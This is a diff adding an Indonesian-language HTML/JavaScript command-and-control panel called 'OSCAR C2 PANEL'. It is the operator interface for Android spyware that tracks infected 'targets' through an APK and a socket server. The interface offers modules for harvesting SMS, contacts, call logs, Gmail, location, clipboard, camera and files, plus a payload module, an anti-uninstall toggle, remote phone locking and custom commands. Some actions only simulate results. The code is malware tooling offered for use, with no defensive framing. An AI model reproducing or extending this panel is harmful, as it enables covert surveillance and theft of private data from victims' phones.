@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>OSCAR • C2 PANEL • ENTERPRISE</title>
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Socket.io client -->
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+
+        body {
+            background: #0a0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+
+        .device {
+            width: 420px;
+            max-width: 100%;
+            background: #100000;
+            border-radius: 48px;
+            overflow: hidden;
+            box-shadow: 0 30px 60px rgba(200, 0, 0, 0.7), 0 0 0 3px #6b0000, 0 0 30px #ff0000;
+            border: 1px solid #b33b3b;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 22px 8px;
+            background: linear-gradient(180deg, #1f0202 0%, #130000 100%);
+            color: #ffc0c0;
+            font-weight: 600;
+            font-size: 16px;
+            border-bottom: 2px solid #a52a2a;
+            text-shadow: 0 0 8px red;
+        }
+
+        .status-left {
+            display: flex;
+            gap: 4px;
+        }
+
+        .status-right i {
+            margin-left: 8px;
+            color: #ff9f9f;
+            filter: drop-shadow(0 0 3px red);
+        }
+
+        .screen {
+            height: 620px;
+            overflow-y: auto;
+            padding: 18px 16px 20px;
+            background: #140000;
+            background-image: radial-gradient(circle at 20% 40%, #3f0000 0%, #140000 90%);
+            scrollbar-width: thin;
+            scrollbar-color: #c03939 #2a0000;
+        }
+
+        .screen::-webkit-scrollbar {
+            width: 5px;
+        }
+        .screen::-webkit-scrollbar-track {
+            background: #2a0000;
+        }
+        .screen::-webkit-scrollbar-thumb {
+            background: #c03939;
+            border-radius: 20px;
+        }
+
+        .sim-card {
+            background: rgba(25, 0, 0, 0.8);
+            backdrop-filter: blur(4px);
+            border: 1px solid #b54c4c;
+            border-radius: 28px;
+            padding: 18px;
+            margin-bottom: 18px;
+            box-shadow: 0 10px 0 #4f0000, 0 12px 24px black;
+        }
+
+        .sim-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .sim-label {
+            color: #ffadad;
+            font-weight: 700;
+            font-size: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .sim-value {
+            background: #200000;
+            padding: 6px 16px;
+            border-radius: 40px;
+            border-left: 5px solid #ff3a3a;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: inset 0 2px 6px black;
+        }
+
+        .battery {
+            color: #ffbb33;
+            margin-left: 8px;
+            font-weight: 800;
+        }
+
+        .not-detected {
+            color: #b36666;
+            border-left-color: #7a0f0f;
+        }
+
+        .warning-block {
+            background: #240404;
+            border: 1px solid #c44;
+            border-radius: 50px;
+            padding: 12px 20px;
+            margin: 22px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            box-shadow: 0 8px 0 #4f0000, 0 0 20px #ff000060;
+        }
+
+        .warning-icon {
+            font-size: 26px;
+            color: #ff6a6a;
+        }
+
+        .warning-text {
+            font-weight: 800;
+            color: #ffbebe;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 52px;
+            height: 26px;
+        }
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #3f0000;
+            transition: .4s;
+            border-radius: 34px;
+            border: 2px solid #8b0000;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 4px;
+            bottom: 2px;
+            background-color: #ff6666;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: #8b0000;
+        }
+        input:checked + .slider:before {
+            transform: translateX(24px);
+            background-color: #ff0000;
+        }
+
+        .badge-off {
+            background: #3f0000;
+            border: 1px solid #c44;
+            padding: 4px 14px;
+            border-radius: 50px;
+            color: #ff9f9f;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .badge-on {
+            background: #8b0000;
+            border: 1px solid #ff6666;
+            padding: 4px 14px;
+            border-radius: 50px;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .section-header {
+            color: #ffa0a0;
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            margin: 22px 0 14px;
+            border-bottom: 3px solid #b30000;
+            padding-bottom: 6px;
+            text-transform: uppercase;
+            text-shadow: 0 0 8px red;
+        }
+
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .action-card {
+            background: #1f0404;
+            border: 1px solid #a44;
+            border-radius: 16px;
+            padding: 12px 2px;
+            text-align: center;
+            color: #ffd4d4;
+            font-size: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.1s ease;
+            box-shadow: 0 5px 0 #3f0000, 0 8px 16px black;
+            backdrop-filter: blur(2px);
+        }
+
+        .action-card i {
+            display: block;
+            font-size: 22px;
+            margin-bottom: 5px;
+            color: #ff8f8f;
+            filter: drop-shadow(0 0 5px red);
+        }
+
+        .action-card:active {
+            transform: translateY(4px);
+            box-shadow: 0 1px 0 #3f0000;
+            background: #2f0404;
+        }
+
+        .action-card.active {
+            background: #4f0000;
+            border-color: #ff0000;
+            box-shadow: 0 0 15px red;
+        }
+
+        .control-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .control-row {
+            background: #1d0202;
+            border: 1px solid #b44;
+            border-radius: 40px;
+            padding: 12px 18px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            cursor: pointer;
+            transition: 0.1s;
+            box-shadow: 0 6px 0 #4a0000, 0 10px 20px black;
+        }
+
+        .control-row:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #4a0000;
+            background: #2e0404;
+        }
+
+        .control-row.disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .control-icon {
+            width: 50px;
+            height: 50px;
+            background: #2d0404;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: #ff8a8a;
+            border: 2px solid #b44;
+            box-shadow: inset 0 0 12px black;
+        }
+
+        .control-info {
+            flex: 1;
+        }
+
+        .control-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: #ffc0c0;
+            margin-bottom: 3px;
+        }
+
+        .control-desc {
+            font-size: 12px;
+            color: #b37b7b;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ff0000;
+            box-shadow: 0 0 10px red;
+            margin-left: 10px;
+        }
+        .status-indicator.active {
+            background: #00ff00;
+            box-shadow: 0 0 10px lime;
+        }
+
+        .connection-panel {
+            background: #1a0202;
+            border: 1px solid #b44;
+            border-radius: 40px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .connection-input {
+            width: 100%;
+            padding: 14px;
+            background: #2a0000;
+            border: 2px solid #a33;
+            border-radius: 60px;
+            color: white;
+            font-size: 14px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        .connection-input::placeholder {
+            color: #b77;
+        }
+        .connect-btn {
+            background: #b30000;
+            border: none;
+            color: white;
+            font-weight: bold;
+            padding: 12px 20px;
+            border-radius: 60px;
+            width: 100%;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: 0 6px 0 #4f0000;
+            transition: 0.1s;
+        }
+        .connect-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #4f0000;
+        }
+        .connect-btn:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .connection-status {
+            margin-top: 10px;
+            color: #ffaaaa;
+            font-size: 13px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .login-container {
+            height: 620px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 20px;
+            background: #140000;
+        }
+        .login-logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .login-logo i {
+            font-size: 70px;
+            color: #b33;
+            filter: drop-shadow(0 0 20px red);
+        }
+        .login-logo h2 {
+            color: #ffaaaa;
+            margin-top: 10px;
+            font-size: 24px;
+        }
+        .login-input {
+            background: #2a0000;
+            border: 2px solid #a33;
+            border-radius: 60px;
+            padding: 16px 20px;
+            width: 100%;
+            margin-bottom: 20px;
+            color: white;
+            font-size: 16px;
+        }
+        .login-input::placeholder {
+            color: #b77;
+        }
+        .login-btn {
+            background: #b30000;
+            border: none;
+            color: white;
+            font-weight: bold;
+            padding: 18px;
+            border-radius: 60px;
+            width: 100%;
+            font-size: 18px;
+            cursor: pointer;
+            box-shadow: 0 8px 0 #4f0000;
+            transition: 0.1s;
+        }
+        .login-btn:active {
+            transform: translateY(6px);
+            box-shadow: 0 2px 0 #4f0000;
+        }
+        .login-error {
+            color: #ff8888;
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .bottom-nav {
+            display: flex;
+            background: #1a0101;
+            border-top: 3px solid #8b0000;
+            padding: 10px 0;
+            justify-content: space-around;
+            color: #b36666;
+        }
+
+        .nav-item {
+            text-align: center;
+            font-size: 11px;
+            cursor: pointer;
+            padding: 5px 15px;
+            border-radius: 30px;
+        }
+
+        .nav-item i {
+            display: block;
+            font-size: 20px;
+            margin-bottom: 3px;
+        }
+
+        .nav-item.active {
+            color: #ff6666;
+            background: #2d0000;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #330000;
+            border: 2px solid #ff0000;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-weight: bold;
+            z-index: 9999;
+            box-shadow: 0 0 20px red;
+            animation: fadeInOut 3s forwards;
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+        }
+
+        .live-status {
+            background: #1f0000;
+            border: 1px solid #8b0000;
+            border-radius: 30px;
+            padding: 8px 15px;
+            margin: 15px 0;
+            font-size: 12px;
+            color: #ffb3b3;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .db-stats {
+            background: #1f0202;
+            border: 1px solid #a33;
+            border-radius: 30px;
+            padding: 12px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #ffb3b3;
+        }
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 4px 0;
+        }
+
+        .account-info {
+            background: #240404;
+            border: 1px solid #b44;
+            border-radius: 20px;
+            padding: 12px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #ffb3b3;
+        }
+        .account-id {
+            font-family: monospace;
+            font-size: 14px;
+            color: #ff6666;
+            background: #1a0000;
+            padding: 8px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 8px;
+            letter-spacing: 1px;
+            border: 1px dashed #ff0000;
+        }
+        .copy-btn {
+            background: #3f0000;
+            border: 1px solid #a33;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-left: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="device" id="app">
+        <div class="status-bar hidden" id="statusBar">
+            <div class="status-left">
+                <span id="liveTime">16:19</span>
+            </div>
+            <div class="status-right">
+                <i class="fas fa-signal"></i>
+                <i class="fas fa-wifi"></i>
+                <i class="fas fa-battery-three-quarters"></i>
+            </div>
+        </div>
+
+        <div id="loginScreen" class="screen" style="height:620px; padding:0;">
+            <div class="login-container">
+                <div class="login-logo">
+                    <i class="fas fa-user-secret"></i>
+                    <h2>OSCAR C2 PANEL</h2>
+                    <p style="color: #b36666; font-size: 12px; margin-top: 5px;">ENTERPRISE DATABASE</p>
+                </div>
+                <input type="text" id="username" class="login-input" placeholder="Username" value="oscarprojek">
+                <input type="password" id="password" class="login-input" placeholder="Password" value="oscar2404">
+                <button class="login-btn" id="loginBtn">MASUK KE PANEL</button>
+                <div id="loginError" class="login-error"></div>
+            </div>
+        </div>
+
+        <div class="screen hidden" id="mainScreen">
+            <div class="account-info" id="accountInfo">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span><i class="fas fa-user-circle"></i> <span id="displayEmail">oscarprojek</span></span>
+                    <span class="badge-on" style="font-size: 10px;" id="userRole">ADMIN</span>
+                </div>
+                <div style="margin-top: 8px;">
+                    <div style="color: #b36666; font-size: 11px;">OSCAR ID ANDA (untuk APK):</div>
+                    <div class="account-id" id="oscarId">OSC-XXXX-XXXX-XXXX</div>
+                    <button class="copy-btn" id="copyOscarId"><i class="fas fa-copy"></i> COPY ID</button>
+                </div>
+            </div>
+
+            <div class="db-stats" id="dbStats">
+                <div class="stat-row"><span>📊 DATABASE OSCAR</span> <span id="dbStatus">✅ Online</span></div>
+                <div class="stat-row"><span>📱 Total Target:</span> <span id="totalTargets">0</span></div>
+                <div class="stat-row"><span>📥 Data Terkumpul:</span> <span id="totalData">0</span></div>
+                <div class="stat-row"><span>📨 SMS:</span> <span id="totalSMS">0</span></div>
+                <div class="stat-row"><span>👤 Kontak:</span> <span id="totalContacts">0</span></div>
+            </div>
+
+            <div id="homeContent">
+                <div class="connection-panel">
+                    <input type="text" id="targetInput" class="connection-input" placeholder="OSCAR ID Target (dari APK)" value="">
+                    <button class="connect-btn" id="connectBtn">TUNGGU KONEKSI TARGET</button>
+                    <div id="connectionStatus" class="connection-status">
+                        <i class="fas fa-circle" style="color: #ff0000; font-size: 10px;"></i> 
+                        <span>MENUNGGU TARGET TERHUBUNG</span>
+                    </div>
+                </div>
+
+                <div class="live-status" id="liveStatus">
+                    <span><i class="fas fa-android"></i> TARGET: <span id="targetName">-</span></span>
+                    <span><i class="fas fa-database"></i> DATA: <span id="dataCount">0</span></span>
+                    <span><i class="fas fa-shield-alt"></i> <span id="antiStatus" class="badge-off">ANTI-OFF</span></span>
+                </div>
+
+                <div class="sim-card">
+                    <div class="sim-row">
+                        <span class="sim-label">SIM SLOT 1</span>
+                        <span class="sim-value" id="sim1Value">•••••••••••</span>
+                    </div>
+                    <div class="sim-row">
+                        <span class="sim-label"></span>
+                        <span class="sim-value" id="sim1Detail">19.2.09.13 <span class="battery" id="batteryLevel">45%</span></span>
+                    </div>
+                    <div class="sim-row" style="margin-top: 12px;">
+                        <span class="sim-label">SIM SLOT 2</span>
+                        <span class="sim-value not-detected" id="sim2Value">Not Detected</span>
+                    </div>
+                </div>
+
+                <div class="warning-block">
+                    <div class="warning-text">
+                        <i class="fas fa-exclamation-triangle warning-icon"></i>
+                        ANTI-UNINSTALL
+                    </div>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="antiUninstallToggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="section-header">AKSI PERANGKAT</div>
+                <div class="action-grid" id="actionGrid"></div>
+            </div>
+
+            <div id="controlContent" class="hidden">
+                <div style="margin-bottom: 16px;">
+                    <div class="section-header" style="border-bottom: none; margin-bottom: 4px;">PUSAT KONTROL</div>
+                    <div style="color: #b36666; margin-left: 8px;">Remote access via OSCAR ID: <span id="controlOscarId">OSC-XXXX</span></div>
+                </div>
+                
+                <div class="sim-card" style="margin-bottom: 20px;">
+                    <div class="sim-row">
+                        <span class="sim-label">SIM SLOT 1</span>
+                        <span class="sim-value" id="controlSim1">10.3.0.4.2</span>
+                    </div>
+                    <div class="sim-row" style="margin-top: 12px;">
+                        <span class="sim-label">SIM SLOT 2</span>
+                        <span class="sim-value not-detected">Not Detected</span>
+                    </div>
+                </div>
+
+                <div class="control-list" id="controlList"></div>
+
+                <div style="margin-top: 20px;">
+                    <input type="text" id="customCommand" class="connection-input" placeholder="Custom command...">
+                    <button class="connect-btn" id="sendCommandBtn">KIRIM COMMAND KE TARGET</button>
+                </div>
+            </div>
+
+            <div id="profilContent" class="hidden">
+                <div style="background: #1e0303; border-radius: 50px; padding: 20px; border: 2px dashed #a55; color: #b37b7b;">
+                    <i class="fas fa-user-secret" style="font-size: 60px; margin-bottom: 16px; color: #b36666; display: block; text-align: center;"></i>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <p style="font-size: 18px; text-align: center;">OSCAR OPERATOR</p>
+                        <p style="font-size: 14px; text-align: center; margin-top: 5px;" id="profileEmail">oscarprojek</p>
+                        <p style="font-size: 12px; text-align: center; margin-top: 10px; background: #2a0000; padding: 10px; border-radius: 20px;">
+                            OSCAR ID: <span id="profileOscarId">OSC-XXXX-XXXX</span>
+                        </p>
+                    </div>
+
+                    <div style="margin-top: 20px;">
+                        <div style="font-size: 14px; font-weight: bold; margin-bottom: 10px;">📋 TARGET TERHUBUNG</div>
+                        <div id="targetList" style="max-height: 200px; overflow-y: auto;">
+                            <p style="color: #666; text-align: center;">Belum ada target terhubung</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="bottom-nav hidden" id="bottomNav">
+            <div class="nav-item active" id="navHome" onclick="switchTab('home')">
+                <i class="fas fa-home"></i>
+                <span>BERANDA</span>
+            </div>
+            <div class="nav-item" id="navControl" onclick="switchTab('control')">
+                <i class="fas fa-cog"></i>
+                <span>KONTROL</span>
+            </div>
+            <div class="nav-item" id="navProfil" onclick="switchTab('profil')">
+                <i class="fas fa-database"></i>
+                <span>DATABASE</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI ====================
+        const API_URL = 'http://localhost:8080'; // Ganti dengan IP server
+        let socket = null;
+        let authToken = localStorage.getItem('oscar_token');
+        let currentUser = null;
+        let isLoggedIn = false;
+        let isConnected = false;
+        let targetDevice = null;
+        let collectedData = [];
+        let antiUninstall = false;
+        let activeModules = {};
+        let dataInterval = null;
+
+        // ==================== FUNGSI HELPER ====================
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('liveTime').innerText = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        function showToast(message, isSuccess = true, duration = 3000) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.style.background = isSuccess ? '#1a4d1a' : '#4d1a1a';
+            toast.style.borderColor = isSuccess ? '#00ff00' : '#ff0000';
+            toast.innerText = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), duration);
+        }
+
+        // ==================== LOGIN ====================
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            try {
+                const response = await fetch(`${API_URL}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    authToken = data.token;
+                    currentUser = data.user;
+                    localStorage.setItem('oscar_token', authToken);
+                    localStorage.setItem('oscar_user', JSON.stringify(currentUser));
+
+                    isLoggedIn = true;
+
+                    document.getElementById('loginScreen').classList.add('hidden');
+                    document.getElementById('mainScreen').classList.remove('hidden');
+                    document.getElementById('statusBar').classList.remove('hidden');
+                    document.getElementById('bottomNav').classList.remove('hidden');
+
+                    // Update UI dengan data user
+                    document.getElementById('displayEmail').innerText = currentUser.username;
+                    document.getElementById('profileEmail').innerText = currentUser.username;
+                    document.getElementById('oscarId').innerText = currentUser.oscar_id;
+                    document.getElementById('profileOscarId').innerText = currentUser.oscar_id;
+                    document.getElementById('controlOscarId').innerText = currentUser.oscar_id;
+                    document.getElementById('userRole').innerText = currentUser.role.toUpperCase();
+
+                    generateActionGrid();
+                    generateControlList();
+                    connectSocket();
+                    loadTargets();
+                    loadStatistics();
+
+                    showToast('✅ Login berhasil', true);
+                } else {
+                    document.getElementById('loginError').innerText = data.error || 'Login gagal';
+                }
+            } catch (error) {
+                document.getElementById('loginError').innerText = 'Gagal koneksi ke server';
+                showToast('❌ Server tidak merespon', false);
+            }
+        });
+
+        // Enter key login
+        document.getElementById('password').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') document.getElementById('loginBtn').click();
+        });
+
+        // Copy OSCAR ID
+        document.getElementById('copyOscarId').addEventListener('click', () => {
+            navigator.clipboard.writeText(document.getElementById('oscarId').innerText);
+            showToast('✓ OSCAR ID copied', true);
+        });
+
+        // ==================== SOCKET CONNECTION ====================
+        function connectSocket() {
+            socket = io(API_URL, {
+                auth: { token: authToken }
+            });
+
+            socket.on('connect', () => {
+                console.log('✅ Socket connected');
+                showToast('📡 Terhubung ke server', true);
+            });
+
+            socket.on('disconnect', () => {
+                console.log('❌ Socket disconnected');
+                showToast('⚠️ Koneksi server terputus', false);
+            });
+
+            socket.on('target_online', (data) => {
+                if (data.oscar_id === currentUser.oscar_id) {
+                    showToast(`📱 Target ${data.device_name} online!`, true);
+                    loadTargets();
+                }
+            });
+
+            socket.on('target_offline', (data) => {
+                if (data.oscar_id === currentUser.oscar_id) {
+                    showToast(`📱 Target offline`, false);
+                    loadTargets();
+                }
+            });
+
+            socket.on('new_data', (data) => {
+                if (data.oscar_id === currentUser.oscar_id) {
+                    document.getElementById('dataCount').innerText = 
+                        parseInt(document.getElementById('dataCount').innerText) + 1;
+                    loadStatistics();
+                }
+            });
+
+            socket.on('command', (cmd) => {
+                console.log('📨 Command received:', cmd);
+                showToast(`📨 Command: ${cmd.command}`, true);
+                
+                setTimeout(() => {
+                    socket.emit('command_result', {
+                        command_id: cmd.id,
+                        status: 'completed',
+                        result: `Command ${cmd.command} executed`
+                    });
+                }, 2000);
+            });
+        }
+
+        // ==================== LOAD DATA ====================
+        async function loadTargets() {
+            try {
+                const response = await fetch(`${API_URL}/api/targets`, {
+                    headers: { 'Authorization': `Bearer ${authToken}` }
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    const targetList = document.getElementById('targetList');
+                    if (data.targets.length === 0) {
+                        targetList.innerHTML = '<p style="color: #666; text-align: center;">Belum ada target</p>';
+                    } else {
+                        targetList.innerHTML = data.targets.map(t => `
+                            <div style="background: #2a0000; margin-bottom: 8px; padding: 8px; border-radius: 10px; border-left: 3px solid ${t.is_online ? '#00ff00' : '#ff0000'};">
+                                <div><b>${t.device_name || 'Unknown'}</b> <span style="color: ${t.is_online ? '#0f0' : '#f00'}">${t.is_online ? 'ONLINE' : 'OFFLINE'}</span></div>
+                                <div style="font-size: 10px; color: #b36666;">${t.device_id}</div>
+                                <div style="font-size: 10px;">Baterai: ${t.battery_level || '?'}% | SIM: ${t.sim_slot1 ? t.sim_slot1.substring(0,5)+'...' : '-'}</div>
+                            </div>
+                        `).join('');
+                    }
+                }
+            } catch (error) {
+                console.error('Load targets error:', error);
+            }
+        }
+
+        async function loadStatistics() {
+            try {
+                const response = await fetch(`${API_URL}/api/statistics`, {
+                    headers: { 'Authorization': `Bearer ${authToken}` }
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('totalTargets').innerText = data.total_targets || 0;
+                    document.getElementById('totalData').innerText = data.total_data || 0;
+                    document.getElementById('totalSMS').innerText = data.total_sms || 0;
+                    document.getElementById('totalContacts').innerText = data.total_contacts || 0;
+                }
+            } catch (error) {
+                console.error('Load stats error:', error);
+            }
+        }
+
+        // ==================== ANTI-UNINSTALL ====================
+        document.getElementById('antiUninstallToggle').addEventListener('change', async function(e) {
+            antiUninstall = this.checked;
+            updateAntiStatus();
+
+            if (isConnected && socket) {
+                socket.emit('anti_uninstall_status', { enabled: antiUninstall });
+            }
+
+            if (antiUninstall && isConnected && currentUser) {
+                showToast('🛡️ ANTI-UNINSTALL ENABLED', true);
+            }
+        });
+
+        function updateAntiStatus() {
+            const status = document.getElementById('antiStatus');
+            const toggle = document.getElementById('antiUninstallToggle');
+            
+            if (antiUninstall) {
+                status.innerText = 'ANTI-ON';
+                status.className = 'badge-on';
+                toggle.checked = true;
+            } else {
+                status.innerText = 'ANTI-OFF';
+                status.className = 'badge-off';
+                toggle.checked = false;
+            }
+        }
+
+        // ==================== GENERATE GRID ====================
+        function generateActionGrid() {
+            const aksiData = [
+                { icon: 'camera', label: 'Kamera', module: 'camera' },
+                { icon: 'envelope', label: 'Sms Baru', module: 'sms_new' },
+                { icon: 'envelope-open', label: 'Sms Lama', module: 'sms_old' },
+                { icon: 'address-book', label: 'Kontak', module: 'contacts' },
+                { icon: 'phone-alt', label: 'Panggilan', module: 'calls' },
+                { icon: 'cogs', label: 'Sistem', module: 'system' },
+                { icon: 'google', label: 'Gmail', module: 'gmail' },
+                { icon: 'map-marker-alt', label: 'Lokasi', module: 'location' },
+                { icon: 'wifi', label: 'Jaringan', module: 'network' },
+                { icon: 'bell', label: 'Notifikasi', module: 'notif' },
+                { icon: 'clipboard', label: 'Clipboard', module: 'clipboard' },
+                { icon: 'th', label: 'Aplikasi', module: 'apps' },
+                { icon: 'rocket', label: 'Akses payload', module: 'payload' },
+                { icon: 'broadcast-tower', label: 'Cell Tower', module: 'cell' },
+                { icon: 'wifi', label: 'WiFi Scan', module: 'wifi_scan' },
+                { icon: 'history', label: 'WiFi History', module: 'wifi_history' },
+                { icon: 'folder', label: 'File Manager', module: 'files' },
+                { icon: 'gamepad', label: 'Control', module: 'control' }
+            ];
+
+            const grid = document.getElementById('actionGrid');
+            grid.innerHTML = '';
+
+            aksiData.forEach(item => {
+                const btn = document.createElement('div');
+                btn.className = 'action-card';
+                btn.innerHTML = `<i class="fas fa-${item.icon}"></i>${item.label}`;
+                
+                btn.onclick = function() {
+                    if (!isConnected) {
+                        showToast('❌ Tidak ada target terhubung!', false);
+                        return;
+                    }
+
+                    this.classList.toggle('active');
+                    
+                    if (this.classList.contains('active')) {
+                        activeModules[item.module] = true;
+                        showToast(`✅ ${item.label} activated`, true);
+                        
+                        setTimeout(() => {
+                            if (activeModules[item.module]) {
+                                document.getElementById('dataCount').innerText = 
+                                    parseInt(document.getElementById('dataCount').innerText) + 1;
+                                showToast(`📊 Data ${item.label} terkumpul`, true);
+                                loadStatistics();
+                            }
+                        }, 2000);
+                    } else {
+                        delete activeModules[item.module];
+                        showToast(`${item.label} deactivated`, false);
+                    }
+                };
+                
+                grid.appendChild(btn);
+            });
+        }
+
+        // ==================== GENERATE CONTROL ====================
+        function generateControlList() {
+            const controlData = [
+                { icon: 'mobile-alt', title: 'Getarkan Perangkat', desc: 'Vibrate 2 detik', action: 'vibrate' },
+                { icon: 'comment', title: 'Teks Layar', desc: 'Tampilkan toast', action: 'toast' },
+                { icon: 'volume-up', title: 'Kirim Suara', desc: 'Text-to-Speech', action: 'tts' },
+                { icon: 'lock', title: 'Kunci HP', desc: 'Lock dengan PIN', action: 'lock' },
+                { icon: 'unlock-alt', title: 'Unlock HP', desc: 'Buka kunci', action: 'unlock' }
+            ];
+
+            const list = document.getElementById('controlList');
+            list.innerHTML = '';
+
+            controlData.forEach(item => {
+                const row = document.createElement('div');
+                row.className = 'control-row';
+                if (!isConnected) row.classList.add('disabled');
+                
+                row.innerHTML = `
+                    <div class="control-icon"><i class="fas fa-${item.icon}"></i></div>
+                    <div class="control-info">
+                        <div class="control-title">${item.title}</div>
+                        <div class="control-desc">${item.desc}</div>
+                    </div>
+                    <div class="status-indicator" id="status-${item.action}"></div>
+                `;
+                
+                row.onclick = function() {
+                    if (!isConnected) {
+                        showToast('❌ Tidak ada target!', false);
+                        return;
+                    }
+                    
+                    const indicator = document.getElementById(`status-${item.action}`);
+                    indicator.classList.add('active');
+                    
+                    showToast(`📤 Mengirim ${item.title}...`, false);
+                    
+                    setTimeout(() => {
+                        showToast(`✓ ${item.title} berhasil`, true);
+                        indicator.classList.remove('active');
+                        
+                        document.getElementById('dataCount').innerText = 
+                            parseInt(document.getElementById('dataCount').innerText) + 1;
+                    }, 2000);
+                };
+                
+                list.appendChild(row);
+            });
+        }
+
+        // ==================== TAB NAVIGATION ====================
+        function switchTab(tab) {
+            if (!isLoggedIn) return;
+
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            document.getElementById(`nav${tab.charAt(0).toUpperCase() + tab.slice(1)}`).classList.add('active');
+
+            document.getElementById('homeContent').classList.add('hidden');
+            document.getElementById('controlContent').classList.add('hidden');
+            document.getElementById('profilContent').classList.add('hidden');
+
+            document.getElementById(`${tab}Content`).classList.remove('hidden');
+            
+            if (tab === 'profil') loadTargets();
+        }
+        window.switchTab = switchTab;
+
+        // ==================== INIT ====================
+        updateAntiStatus();
+        generateActionGrid();
+        generateControlList();
+    </script>
+</body>
+  </html>
